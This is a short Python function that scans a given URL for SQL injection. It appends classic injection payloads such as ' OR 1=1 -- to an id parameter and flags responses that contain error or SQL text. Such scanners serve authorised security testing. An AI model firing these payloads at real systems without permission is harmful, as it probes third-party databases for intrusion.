import requests

def check(url):
    print(f"Testing SQL Injection on {url}")
    payloads = ["'", "\"", " OR 1=1 --", "' OR 'a'='a", "\" OR \"a\"=\"a"]
    
    for payload in payloads:
        new_url = f"{url}?id={payload}"
        try:
            response = requests.get(new_url)
            if "error" in response.text or "sql" in response.text.lower():
                print(f"Possible SQL Injection Vulnerability found at {new_url}")
        except requests.RequestException as e:
            print(f"Error testing SQL injection on {url}: {e}")
